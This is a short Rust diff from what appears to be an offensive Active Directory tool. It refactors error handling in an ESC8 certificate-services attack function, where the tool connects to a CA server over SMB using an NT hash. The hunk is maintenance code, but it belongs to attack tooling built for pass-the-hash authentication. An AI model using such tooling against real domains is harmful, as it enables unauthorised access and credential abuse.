@@ -815,17 +815,15 @@ async fn execute_esc8_rpc_dcom(
     // Connect via SMB with password or NT hash
     use overthrone_core::proto::smb::SmbSession;
     let smb = if has_nt_hash {
-        SmbSession::connect_with_hash(
-            ca_server,
-            &config.domain,
-            &config.username,
-            nt_hash.unwrap(),
-        )
-        .await
-        .map_err(|e| OverthroneError::Rpc {
-            target: ca_server.to_string(),
-            reason: format!("SMB connect with hash failed: {e}"),
-        })?
+        let nt_hash_val = nt_hash.ok_or_else(|| {
+            OverthroneError::Adcs("ESC8 DCOM expected NT hash but none was provided".to_string())
+        })?;
+        SmbSession::connect_with_hash(ca_server, &config.domain, &config.username, nt_hash_val)
+            .await
+            .map_err(|e| OverthroneError::Rpc {
+                target: ca_server.to_string(),
+                reason: format!("SMB connect with hash failed: {e}"),
+            })?
     } else {
         SmbSession::connect(
             ca_server,
